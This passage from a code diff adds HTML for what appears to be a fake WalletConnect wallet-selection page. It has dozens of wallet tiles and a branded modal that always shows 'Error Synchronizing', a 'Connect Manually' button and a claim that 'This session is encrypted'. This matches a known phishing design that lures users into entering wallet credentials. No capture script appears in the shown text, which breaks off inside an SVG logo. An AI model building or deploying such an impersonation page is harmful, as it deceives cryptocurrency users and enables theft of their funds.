+                        <img alt="HEREStake" src="https://explorer-api.walletconnect.com/v3/logo/lg/c6d4992b-c10c-45aa-a0e4-8f2d060d5c00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>HEREStake</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="bastion_app" src="https://explorer-api.walletconnect.com/v3/logo/lg/d61342cb-8509-4243-1b4b-b325490feb00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Bastion_app</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="FirnProtocol" src="https://explorer-api.walletconnect.com/v3/logo/lg/24dddd0a-081f-47a9-912b-2b1281161e00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>FirnProtocol</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ChromaSignet" src="https://explorer-api.walletconnect.com/v3/logo/lg/f5de7f14-5d71-413b-5f4b-3c15fc87f200?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ChromaSignet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="DEXStein" src="https://explorer-api.walletconnect.com/v3/logo/lg/a739e624-f0a0-48db-bc92-341b52211c00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>DEXStein</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Bitriel" src="https://explorer-api.walletconnect.com/v3/logo/lg/7ce959cc-75cc-4c34-fdfd-a23dccb0ec00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Bitriel</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Rabby" src="https://explorer-api.walletconnect.com/v3/logo/lg/255e6ba2-8dfd-43ad-e88e-57cbb98f6800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Rabby</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Snap-shack-Cyberbr..." src="https://explorer-api.walletconnect.com/v3/logo/lg/bfc1b1e1-5fcb-4f9e-5809-e87402f35900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Snap-shack-Cyberbr...</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="trace-gift" src="https://explorer-api.walletconnect.com/v3/logo/lg/916c8480-a52d-4f4c-82b5-47cac8c84300?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Trace-gift</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MySabayWeb3" src="https://explorer-api.walletconnect.com/v3/logo/lg/4ace2f92-556a-4c19-fe17-51e223bd4600?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>MySabayWeb3</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Elusiv" src="https://explorer-api.walletconnect.com/v3/logo/lg/822e40a9-0662-4f19-015f-cf3f8867f100?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Elusiv</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Vision:CryptoWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/64ccf07c-1fba-4473-49e8-dc446e5a5000?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Vision:CryptoWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="helixid" src="https://explorer-api.walletconnect.com/v3/logo/lg/4083ef71-8389-4682-ded6-0099236d2e00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Helixid</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Obvious" src="https://explorer-api.walletconnect.com/v3/logo/lg/61abe2ca-b06d-4a8b-de3e-8326f523e900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Obvious</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="CryptoWodlGame" src="https://explorer-api.walletconnect.com/v3/logo/lg/a45f2dc1-ce86-4d65-5591-4af84f168300?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>CryptoWodlGame</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="HashGuessers" src="https://explorer-api.walletconnect.com/v3/logo/lg/b7051db9-1d4f-4fe3-9241-f577d0cad400?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>HashGuessers</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="gm-App" src="https://explorer-api.walletconnect.com/v3/logo/lg/32b894e5-f91e-4fcd-6891-38d31fa6ba00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Gm-App</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="KaononaiProject" src="https://explorer-api.walletconnect.com/v3/logo/lg/a798fae2-1104-4e65-92ae-605017aa9900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>KaononaiProject</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MarinadeFinance" src="https://explorer-api.walletconnect.com/v3/logo/lg/75c0c024-8b6d-4687-d695-906111b57300?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>MarinadeFinance</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Socrates-Test" src="https://explorer-api.walletconnect.com/v3/logo/lg/a50fcabe-7e3d-4e51-dc55-a8af8d365a00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Socrates-Test</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="OpenTheta" src="https://explorer-api.walletconnect.com/v3/logo/lg/8a7296f6-d66b-417e-cb81-9e94d92d1500?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>OpenTheta</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ixir" src="https://explorer-api.walletconnect.com/v3/logo/lg/237acac5-62c5-47cb-41a2-5911c3b62700?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Ixir</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="AwardPool" src="https://explorer-api.walletconnect.com/v3/logo/lg/4d0695c4-c6a4-4d94-390d-8bb7d3f94300?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>AwardPool</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="centic" src="https://explorer-api.walletconnect.com/v3/logo/lg/636ade5a-5c0c-4474-c5ed-63efc172e000?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Centic</p>
+                </a>
+
+          
+<!--
+            
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Dashboard" src="https://explorer-api.walletconnect.com/v3/logo/lg/4bf3892c-3183-457f-cdca-795d08a2c000?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Dashboard</p>
+                </a>
+-->
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Yuzumax" src="https://explorer-api.walletconnect.com/v3/logo/lg/65d3228b-3973-4586-d38f-dc27c2a59a00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Yuzumax</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="TEXAN" src="https://explorer-api.walletconnect.com/v3/logo/lg/0f885df6-1659-48fc-1ac4-f5a1bc995f00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>TEXAN</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Broearn" src="https://explorer-api.walletconnect.com/v3/logo/lg/339b9e9d-e2a7-46eb-4ed3-272321257a00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Broearn</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MaskNetwork" src="https://explorer-api.walletconnect.com/v3/logo/lg/51fa27fd-8a21-4de0-c084-528e4a37ad00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>MaskNetwork</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="PresaleWorld" src="https://explorer-api.walletconnect.com/v3/logo/lg/1c62c0bb-1910-4650-4b5e-3996b0241000?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>PresaleWorld</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Faye" src="https://explorer-api.walletconnect.com/v3/logo/lg/f23601e4-3f9e-4ab1-c865-6b0394944d00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Faye</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Swappy" src="https://explorer-api.walletconnect.com/v3/logo/lg/21bd1f6c-47b7-432d-7e2f-08b7479c2a00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Swappy</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Equaminity" src="https://explorer-api.walletconnect.com/v3/logo/lg/46979590-cfd3-467e-8c46-94f378761000?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Equaminity</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Galleria" src="https://explorer-api.walletconnect.com/v3/logo/lg/4bdd8c4f-50d8-48ef-6d76-0b5fc97fec00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Galleria</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="HieSwap" src="https://explorer-api.walletconnect.com/v3/logo/lg/6f972c32-92fd-42b6-050c-013106798e00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>HieSwap</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="AffineDefi" src="https://explorer-api.walletconnect.com/v3/logo/lg/b4eb15e9-f4e9-489b-f320-3d5e52319a00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>AffineDefi</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ConnextBridge" src="https://explorer-api.walletconnect.com/v3/logo/lg/f4c99c1e-9c69-4326-a578-1b604ff2cc00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ConnextBridge</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Mango" src="https://explorer-api.walletconnect.com/v3/logo/lg/78b67117-7234-4fa1-177c-f03c01e37100?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Mango</p>
+                </a>
+            
+            </div>
+
+
+        </div>
+        
+        <div class="lamda">
+            <div class="lamdax">
+            <div class="lamda1">
+                <div class="top1">
+                    <div class="logo">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1459 238" version="1.1" class="mb-2 h-6"><title>WalletConnect's logo</title><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="walletconnect-logo-2"><path d="M526.766839,130.223822 L506.743339,202.279192 L485.915975,202.279192 L458,96.8269617 L480.873561,96.8269617 L497.462373,173.193962 L498.047001,173.193962 L517.778188,96.8269617 L536.413197,96.8269617 L556.144384,173.193962 L556.729011,173.193962 L573.390902,96.8269617 L596.264463,96.8269617 L568.27541,202.279192 L547.448046,202.279192 L527.424545,130.223822 L526.766839,130.223822 Z M626.665106,188.101969 C635.946072,188.101969 643.619311,182.036456 643.619311,173.559354 L643.619311,167.859233 L627.103577,168.882332 C619.138024,169.46696 614.607159,173.047805 614.607159,178.601768 C614.607159,184.448046 619.430338,188.101969 626.665106,188.101969 Z M619.649573,203.521526 C604.741566,203.521526 593.414403,193.875168 593.414403,179.771024 C593.414403,165.520722 604.376173,157.262855 623.888124,156.0936 L643.619311,154.924344 L643.619311,149.735773 C643.619311,142.427926 638.503818,138.189375 630.465187,138.189375 C622.499633,138.189375 617.457219,142.135612 616.434121,147.908811 L596.922169,147.908811 C597.726033,132.70849 610.660922,122.258269 631.415207,122.258269 C651.511786,122.258269 664.592832,132.635411 664.592832,148.420361 L664.592832,202.279192 L643.984703,202.279192 L643.984703,190.294323 L643.546233,190.294323 C639.161524,198.625269 629.442088,203.521526 619.649573,203.521526 Z M678.843133,202.279192 L678.843133,96.8269617 L700.182046,96.8269617 L700.182046,202.279192 L678.843133,202.279192 Z M715.090054,202.279192 L715.090054,96.8269617 L736.428966,96.8269617 L736.428966,202.279192 L715.090054,202.279192 Z M785.976168,138.043218 C776.622124,138.043218 769.898905,145.13183 769.168121,154.924344 L802.418824,154.924344 C801.980353,144.912594 795.476369,138.043218 785.976168,138.043218 Z M802.711138,178.309455 L822.296167,178.309455 C819.957656,193.655933 805.92659,203.959997 786.560796,203.959997 C762.444901,203.959997 747.975365,188.54044 747.975365,163.474525 C747.975365,138.481689 762.591058,122.258269 785.756933,122.258269 C808.557415,122.258269 822.953874,137.677826 822.953874,161.501407 L822.953874,168.00539 L768.948885,168.00539 L768.948885,169.320803 C768.948885,180.501809 776.037497,188.175048 786.926188,188.175048 C794.745585,188.175048 800.738019,184.301889 802.711138,178.309455 Z M839.615765,105.888692 L860.954677,105.888692 L860.954677,123.939074 L875.424214,123.939074 L875.424214,140.016337 L860.954677,140.016337 L860.954677,177.505591 C860.954677,183.498026 863.877816,186.348086 870.162565,186.348086 C872.062605,186.348086 874.035723,186.201929 875.351136,185.982694 L875.351136,201.694565 C873.158782,202.206114 869.504858,202.571506 865.193229,202.571506 C846.777455,202.571506 839.615765,196.432915 839.615765,181.159515 L839.615765,140.016337 L828.580916,140.016337 L828.580916,123.939074 L839.615765,123.939074 L839.615765,105.888692 Z M935.567794,204.106154 C904.874837,204.106154 885.6552,183.571104 885.6552,149.516538 C885.6552,115.53505 905.020994,95 935.567794,95 C960.926023,95 980.218739,111.077263 981.899543,134.681609 L960.414474,134.681609 C958.368277,121.74672 948.429605,113.269617 935.567794,113.269617 C918.905903,113.269617 908.163368,127.227605 908.163368,149.443459 C908.163368,171.951628 918.759746,185.836537 935.640873,185.836537 C948.721919,185.836537 958.149041,178.163298 960.487552,165.666879 L981.972622,165.666879 C979.487954,189.198146 961.437572,204.106154 935.567794,204.106154 Z M1029.69286,203.959997 C1006.01544,203.959997 990.888195,188.759676 990.888195,163.036055 C990.888195,137.677826 1006.23467,122.258269 1029.69286,122.258269 C1053.15105,122.258269 1068.49753,137.604747 1068.49753,163.036055 C1068.49753,188.832754 1053.37029,203.959997 1029.69286,203.959997 Z M1029.69286,187.663499 C1040.14308,187.663499 1046.79322,178.821004 1046.79322,163.109133 C1046.79322,147.543419 1040.07,138.554767 1029.69286,138.554767 C1019.31572,138.554767 1012.51942,147.543419 1012.51942,163.109133 C1012.51942,178.821004 1019.16956,187.663499 1029.69286,187.663499 Z M1079.4593,202.279192 L1079.4593,123.939074 L1100.06743,123.939074 L1100.06743,137.897061 L1100.5059,137.897061 C1104.67137,128.177625 1112.92924,122.477504 1124.98719,122.477504 C1142.37986,122.477504 1152.17238,133.439275 1152.17238,151.78197 L1152.17238,202.279192 L1130.83346,202.279192 L1130.83346,156.239757 C1130.83346,146.008771 1126.01028,140.162494 1116.437,140.162494 C1106.86373,140.162494 1100.79821,147.178027 1100.79821,157.335934 L1100.79821,202.279192 L1079.4593,202.279192 Z M1165.69189,202.279192 L1165.69189,123.939074 L1186.30002,123.939074 L1186.30002,137.897061 L1186.73849,137.897061 C1190.90396,128.177625 1199.16183,122.477504 1211.21978,122.477504 C1228.61245,122.477504 1238.40497,133.439275 1238.40497,151.78197 L1238.40497,202.279192 L1217.06606,202.279192 L1217.06606,156.239757 C1217.06606,146.008771 1212.24288,140.162494 1202.6696,140.162494 C1193.09632,140.162494 1187.03081,147.178027 1187.03081,157.335934 L1187.03081,202.279192 L1165.69189,202.279192 Z M1287.07523,138.043218 C1277.72119,138.043218 1270.99797,145.13183 1270.26718,154.924344 L1303.51789,154.924344 C1303.07941,144.912594 1296.57543,138.043218 1287.07523,138.043218 Z M1303.8102,178.309455 L1323.39523,178.309455 C1321.05672,193.655933 1307.02565,203.959997 1287.65986,203.959997 C1263.54396,203.959997 1249.07443,188.54044 1249.07443,163.474525 C1249.07443,138.481689 1263.69012,122.258269 1286.85599,122.258269 C1309.65648,122.258269 1324.05293,137.677826 1324.05293,161.501407 L1324.05293,168.00539 L1270.04795,168.00539 L1270.04795,169.320803 C1270.04795,180.501809 1277.13656,188.175048 1288.02525,188.175048 C1295.84465,188.175048 1301.83708,184.301889 1303.8102,178.309455 Z M1406.19313,153.097383 L1386.38887,153.097383 C1385.14653,144.839516 1379.66565,138.993238 1370.89623,138.993238 C1360.37293,138.993238 1353.79587,147.908811 1353.79587,163.036055 C1353.79587,178.455611 1360.37293,187.225028 1370.96931,187.225028 C1379.51949,187.225028 1385.07346,182.109535 1386.38887,173.559354 L1406.26621,173.559354 C1405.17004,192.048207 1391.3582,203.959997 1370.75008,203.959997 C1347.14573,203.959997 1332.16464,188.613519 1332.16464,163.036055 C1332.16464,137.897061 1347.14573,122.258269 1370.60392,122.258269 C1391.79668,122.258269 1405.24311,135.339315 1406.19313,153.097383 Z M1422.2704,105.888692 L1443.60931,105.888692 L1443.60931,123.939074 L1458.07885,123.939074 L1458.07885,140.016337 L1443.60931,140.016337 L1443.60931,177.505591 C1443.60931,183.498026 1446.53245,186.348086 1452.8172,186.348086 C1454.71724,186.348086 1456.69036,186.201929 1458.00577,185.982694 L1458.00577,201.694565 C1455.81341,202.206114 1452.15949,202.571506 1447.84786,202.571506 C1429.43209,202.571506 1422.2704,196.432915 1422.2704,181.159515 L1422.2704,140.016337 L1411.23555,140.016337 L1411.23555,123.939074 L1422.2704,123.939074 L1422.2704,105.888692 Z" id="WalletConnect" fill="#3999FB"></path><path d="M79.4992542,46.5389641 C142.715504,-15.3550143 245.209294,-15.3550143 308.425541,46.5389641 L316.033719,53.9880033 C319.194531,57.0827021 319.194531,62.1002006 316.033719,65.1949006 L290.007661,90.6765804 C288.427255,92.2239311 285.86491,92.2239311 284.284504,90.6765804 L273.814748,80.4258162 C229.713513,37.2470301 158.211283,37.2470301 114.110047,80.4258162 L102.897805,91.4035389 C101.317397,92.9508883 98.755052,92.9508883 97.1746471,91.4035389 L71.1485898,65.9218591 C67.9877774,62.8271591 67.9877774,57.8096606 71.1485898,54.7149619 L79.4992542,46.5389641 Z M362.249885,99.2377722 L385.413126,121.916595 C388.573922,125.01128 388.573941,130.028748 385.413167,133.123453 L280.968512,235.385079 C277.807722,238.479801 272.683033,238.479836 269.522198,235.385159 C269.522185,235.385146 269.52217,235.385132 269.522157,235.385118 L195.393696,162.807065 C194.603493,162.03339 193.32232,162.03339 192.532117,162.807065 C192.532112,162.80707 192.532108,162.807076 192.532103,162.807079 L118.40522,235.385079 C115.24444,238.479809 110.119749,238.479861 106.958905,235.385192 C106.958887,235.385174 106.958867,235.385155 106.958847,235.385136 L2.51128675,133.12215 C-0.649524409,130.027451 -0.649524409,125.009953 2.51128675,121.915254 L25.6745697,99.2364692 C28.8353808,96.1417705 33.9600712,96.1417705 37.1208837,99.2364692 L111.250424,171.815537 C112.040627,172.589212 113.321798,172.589212 114.112002,171.815537 C114.112014,171.815525 114.112024,171.815514 114.112036,171.815505 L188.237861,99.2364692 C191.398601,96.1416993 196.523291,96.1415832 199.684176,99.2362107 C199.68422,99.2362542 199.684263,99.2362977 199.684307,99.2363413 L273.813749,171.815505 C274.603952,172.589179 275.885125,172.589179 276.675327,171.815505 L350.803571,99.2377722 C353.964384,96.1430722 359.089073,96.1430722 362.249885,99.2377722 Z" id="WalletConnect" fill="#3B99FC" fill-rule="nonzero"></path></g></g></svg>
+                    </div>
+                    <div class="cancel">
+                        <svg stroke="currentColor" fill="none" stroke-width="0" viewBox="0 0 24 24" aria-hidden="true" font-size="1.5rem" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                    </div>
+                </div>
+                    <div class="initial">
+                        <p class="green">Initializing</p>
+                        <div class="initial1">
+                        <p class="red">Error Synchronizing</p>
+                        <button>Connect Manually</button>
+                    </div>
+                    </div>
+
+                    <div class="manual">
+                        <div class="rock">
+                            <div class="rock1">Wallet</div>
+                            <p>This session is encrypted</p>
+                        </div>
+                        <div class="cat">
+                            <img src="https://registry.walletconnect.com/api/v1/logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96" alt="" class="mx-1 w-12 rounded-full">
+                        </div>
+                    </div>
+            </div>
+
+            <div class="lamda2 hide">
+                <div class="toper1">
+                    <div class="logo">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1459 238" version="1.1" class="mb-2 h-6"><title>WalletConnect's logo</title><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="walletconnect-logo-2"><path d="M526.766839,130.223822 L506.743339,202.279192 L485.915975,202.279192 L458,96.8269617 L480.873561,96.8269617 L497.462373,173.193962 L498.047001,173.193962 L517.778188,96.8269617 L536.413197,96.8269617 L556.144384,173.193962 L556.729011,173.193962 L573.390902,96.8269617 L596.264463,96.8269617 L568.27541,202.279192 L547.448046,202.279192 L527.424545,130.223822 L526.766839,130.223822 Z M626.665106,188.101969 C635.946072,188.101969 643.619311,182.036456 643.619311,173.559354 L643.619311,167.859233 L627.103577,168.882332 C619.138024,169.46696 614.607159,173.047805 614.607159,178.601768 C614.607159,184.448046 619.430338,188.101969 626.665106,188.101969 Z M619.649573,203.521526 C604.741566,203.521526 593.414403,193.875168 593.414403,179.771024 C593.414403,165.520722 604.376173,157.262855 623.888124,156.0936 L643.619311,154.924344 L643.619311,149.735773 C643.619311,142.427926 638.503818,138.189375 630.465187,138.189375 C622.499633,138.189375 617.457219,142.135612 616.434121,147.908811 L596.922169,147.908811 C597.726033,132.70849 610.660922,122.258269 631.415207,122.258269 C651.511786,122.258269 664.592832,132.635411 664.592832,148.420361 L664.592832,202.279192 L643.984703,202.279192 L643.984703,190.294323 L643.546233,190.294323 C639.161524,198.625269 629.442088,203.521526 619.649573,203.521526 Z M678.843133,202.279192 L678.843133,96.8269617 L700.182046,96.8269617 L700.182046,202.279192 L678.843133,202.279192 Z M715.090054,202.279192 L715.090054,96.8269617 L736.428966,96.8269617 L736.428966,202.279192 L715.090054,202.279192 Z M785.976168,138.043218 C776.622124,138.043218 769.898905,145.13183 769.168121,154.924344 L802.418824,154.924344 C801.980353,144.912594 795.476369,138.043218 785.976168,138.043218 Z M802.711138,178.309455 L822.296167,178.309455 C819.957656,193.655933 805.92659,203.959997 786.560796,203.959997 C762.444901,203.959997 747.975365,188.54044 747.975365,163.474525 C747.975365,138.481689 762.591058,122.258269 785.756933,122.258269 C808.557415,122.258269 822.953874,137.677826 822.953874,161.501407 L822.953874,168.00539 L768.948885,168.00539 L768.948885,169.320803 C768.948885,180.501809 776.037497,188.175048 786.926188,188.175048 C794.745585,188.175048 800.738019,184.301889 802.711138,178.309455 Z M839.615765,105.888692 L860.954677,105.888692 L860.954677,123.939074 L875.424214,123.939074 L875.424214,140.016337 L860.954677,140.016337 L860.954677,177.505591 C860.954677,183.498026 863.877816,186.348086 870.162565,186.348086 C872.062605,186.348086 874.035723,186.201929 875.351136,185.982694 L875.351136,201.694565 C873.158782,202.206114 869.504858,202.571506 865.193229,202.571506 C846.777455,202.571506 839.615765,196.432915 839.615765,181.159515 L839.615765,140.016337 L828.580916,140.016337 L828.580916,123.939074 L839.615765,123.939074 L839.615765,105.888692 Z M935.567794,204.106154 C904.874837,204.106154 885.6552,183.571104 885.6552,149.516538 C885.6552,115.53505 905.020994,95 935.567794,95 C960.926023,95 980.218739,111.077263 981.899543,134.681609 L960.414474,134.681609 C958.368277,121.74672 948.429605,113.269617 935.567794,113.269617 C918.905903,113.269617 908.163368,127.227605 908.163368,149.443459 C908.163368,171.951628 918.759746,185.836537 935.640873,185.836537 C948.721919,185.836537 958.149041,178.163298 960.487552,165.666879 L981.972622,165.666879 C979.487954,189.198146 961.437572,204.106154 935.567794,204.106154 Z M1029.69286,203.959997 C1006.01544,203.959997 990.888195,188.759676 990.888195,163.036055 C990.888195,137.677826 1006.23467,122.258269 1029.69286,122.258269 C1053.15105,122.258269 1068.49753,137.604747 1068.49753,163.036055 C1068.49753,188.832754 1053.37029,203.959997 1029.69286,203.959997 Z M1029.69286,187.663499 C1040.14308,187.663499 1046.79322,178.821004 1046.79322,163.109133 C1046.79322,147.543419 1040.07,138.554767 1029.69286,138.554767 C1019.31572,138.554767 1012.51942,147.543419 1012.51942,163.109133 C1012.51942,178.821004 1019.16956,187.663499 1029.69286,187.663499 Z M1079.4593,202.279192 L1079.4593,123.939074 L1100.06743,123.939074 L1100.06743,137.897061 L1100.5059,137.897061 C1104.67137,128.177625 1112.92924,122.477504 1124.98719,122.477504 C1142.37986,122.477504 1152.17238,133.439275 1152.17238,151.78197 L1152.17238,202.279192 L1130.83346,202.279192 L1130.83346,156.239757 C1130.83346,146.008771 1126.01028,140.162494 1116.437,140.162494 C1106.86373,140.162494 1100.79821,147.178027 1100.79821,157.335934 L1100.79821,202.279192 L1079.4593,202.279192 Z M1165.69189,202.279192 L1165.69189,123.939074 L1186.30002,123.939074 L1186.30002,137.897061 L1186.73849,137.897061 C1190.90396,128.177625 1199.16183,122.477504 1211.21978,122.477504 C1228.61245,122.477504 1238.40497,133.439275 1238.40497,151.78197 L1238.40497,202.279192 L1217.06606,202.279192 L1217.06606,156.239757 C1217.06606,146.008771 1212.24288,140.162494 1202.6696,140.162494 C1193.09632,140.162494 1187.03081,147.178027 1187.03081,157.335934 L1187.03081,202.279192 L1165.69189,202.279192 Z M1287.07523,138.043218 C1277.72119,138.043218 1270.99797,145.13183 1270.26718,154.924344 L1303.51789,154.924344 C1303.07941,144.912594 1296.57543,138.043218 1287.07523,138.043218 Z M1303.8102,178.309455 L1323.39523,178.309455 C1321.05672,193.655933 1307.02565,203.959997 1287.65986,203.959997 C1263.54396,203.959997 1249.07443,188.54044 1249.07443,163.474525 C1249.07443,138.481689 1263.69012,122.258269 1286.85599,122.258269 C1309.65648,122.258269 1324.05293,137.677826 1324.05293,161.501407 L1324.05293,168.00539 L1270.04795,168.00539 L1270.04795,169.320803 C1270.04795,180.501809 1277.13656,188.175048 1288.02525,188.175048 C1295.84465,188.175048 1301.83708,184.301889 1303.8102,178.309455 Z M1406.19313,153.097383 L1386.38887,153.097383 C1385.14653,144.839516 1379.66565,138.993238 1370.89623,138.993238 C1360.37293,138.993238 1353.79587,147.908811 1353.79587,163.036055 C1353.79587,178.455611 1360.37293,187.225028 1370.96931,187.225028 C1379.51949,187.225028 1385.07346,182.109535 1386.38887,173.559354 L1406.26621,173.559354 C1405.17004,192.048207 1391.3582,203.959997 1370.75008,203.959997 C1347.14573,203.959997 1332.16464,188.613519 1332.16464,163.036055 C1332.16464,137.897061 1347.14573,122.258269 1370.60392,122.258269 C1391.79668,122.258269 1405.24311,135.339315 1406.19313,153.097383 Z M1422.2704,105.888692 L1443.60931,105.888692 L1443.60931,123.939074 L1458.07885,123.939074 L1458.07885,140.016337 L1443.60931,140.016337 L1443.60931,177.505591 C1443.60931,183.498026 1446.53245,186.348086 1452.8172,186.348086 C1454.71724,186.348086 1456.69036,186.201929 1458.00577,185.982694 L1458.00577,201.694565 C1455.81341,202.206114 1452.15949,202.571506 1447.84786,202.571506 C1429.43209,202.571506 1422.2704,196.432915 1422.2704,181.159515 L1422.2704,140.016337 L1411.23555,140.016337 L1411.23555,123.939074 L1422.2704,123.939074 L1422.2704,105.888692 Z" id="WalletConnect" fill="#3999FB"></path><path d="M79.4992542,46.5389641 C142.715504,-15.3550143 245.209294,-15.3550143 308.425541,46.5389641 L316.033719,53.9880033 C319.194531,57.0827021 319.194531,62.1002006 316.033719,65.1949006 L290.007661,90.6765804 C288.427255,92.2239311 285.86491,92.2239311 284.284504,90.6765804 L273.814748,80.4258162 C229.713513,37.2470301 158.211283,37.2470301 114.110047,80.4258162 L102.897805,91.4035389 C101.317397,92.9508883 98.755052,92.9508883 97.1746471,91.4035389 L71.1485898,65.9218591 C67.9877774,62.8271591 67.9877774,57.8096606 71.1485898,54.7149619 L79.4992542,46.5389641 Z M362.249885,99.2377722 L385.413126,121.916595 C388.573922,125.01128 388.573941,130.028748 385.413167,133.123453 L280.968512,235.385079 C277.807722,238.479801 272.683033,238.479836 269.522198,235.385159 C269.522185,235.385146 269.52217,235.385132 269.522157,235.385118 L195.393696,162.807065 C194.603493,162.03339 193.32232,162.03339 192.532117,162.807065 C192.532112,162.80707 192.532108,162.807076 192.532103,162.807079 L118.40522,235.385079 C115.24444,238.479809 110.119749,238.479861 106.958905,235.385192 C106.958887,235.385174 106.958867,235.385155 106.958847,235.385136 L2.51128675,133.12215 C-0.649524409,130.027451 -0.649524409,125.009953 2.51128675,121.915254 L25.6745697,99.2364692 C28.8353808,96.1417705 33.9600712,96.1417705 37.1208837,99.2364692 L111.250424,171.815537 